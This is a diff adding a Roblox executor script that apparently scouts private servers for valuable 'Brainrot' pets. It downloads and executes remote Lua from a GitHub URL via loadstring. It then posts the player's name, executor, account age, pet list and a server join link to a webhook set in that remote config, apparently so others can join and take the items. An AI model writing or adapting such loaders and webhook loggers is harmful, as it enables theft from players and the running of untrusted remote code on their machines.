@@ -1,0 +1,151 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+
+-- Load config from GitHub
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tsetging234/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = {
+            WEBHOOK = "",
+            targetNames = {},
+            Receiver = {}
+        }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Executor & account age detection
+local function detectExecutor()
+    if syn then return "Synapse X"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif fluxus then return "Fluxus"
+    elseif secure_load then return "Sentinel"
+    elseif getexecutorname then return getexecutorname()
+    elseif identifyexecutor then return identifyexecutor()
+    else return "Unknown" end
+end
+
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Detect server type
+local serverType = "UNKNOWN"
+local map = Workspace:FindFirstChild("Map")
+if map then
+    local codes = map:FindFirstChild("Codes")
+    local main = codes and codes:FindFirstChild("Main")
+    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
+    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
+    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
+    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+end
+
+-- Scan all Brainrots
+local function scanAllBrainrots()
+    local found = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return found end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+        if sign and podiums then
+            for _, podium in ipairs(podiums:GetChildren()) do
+                local base = podium:FindFirstChild("Base")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local attachment = spawn and spawn:FindFirstChild("Attachment")
+                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+                if overhead then
+                    local name = overhead:FindFirstChild("DisplayName") and overhead.DisplayName.Text or "Unknown"
+                    table.insert(found, name)
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- Send webhook
+local function sendWebhook(pets)
+    if not pets or #pets == 0 then return end
+    if player and player:GetAttribute("WebhookSent") then return end
+
+    local brainrotDetected = false
+    local petLines = {}
+
+    for _, petName in ipairs(pets) do
+        local isTarget = false
+        for _, t in ipairs(targetNames) do
+            if t.name and petName:find(t.name) then
+                isTarget = true
+                brainrotDetected = true
+                break
+            end
+        end
+        table.insert(petLines, petName .. (isTarget and " ⚠️" or ""))
+    end
+
+    if not brainrotDetected then return end -- only send if a target Brainrot is found
+
+    local lootText = table.concat(petLines, "\n")
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+
+    local embed = {
+        ["title"] = "🧠 Brainrot Detected!",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
+            {["name"]="Server Type", ["value"]=serverType},
+            {["name"]="👥 Player Info", ["value"]="Name: "..(player and player.Name or "Unknown")..
+                "\nReceiver: "..receiverList..
+                "\nExecutor: "..detectExecutor()..
+                "\nAccount Age: "..tostring(getAccountAge()).." days"},
+            {["name"]="🧠 Detected Pets", ["value"]=lootText},
+            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {
+        ["content"] = "📣 @everyone **Brainrot Detected!**",
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = {["parse"]={"everyone"}}
+    }
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and WEBHOOK ~= "" then
+        pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if player then
+            player:SetAttribute("WebhookSent", true)
+        end
+    end
+end
+
+-- Run scan automatically (private servers only)
+if serverType ~= "PUBLIC SERVER" then
+    task.spawn(function()
+        local pets = scanAllBrainrots()
+        sendWebhook(pets)
+    end)
+end
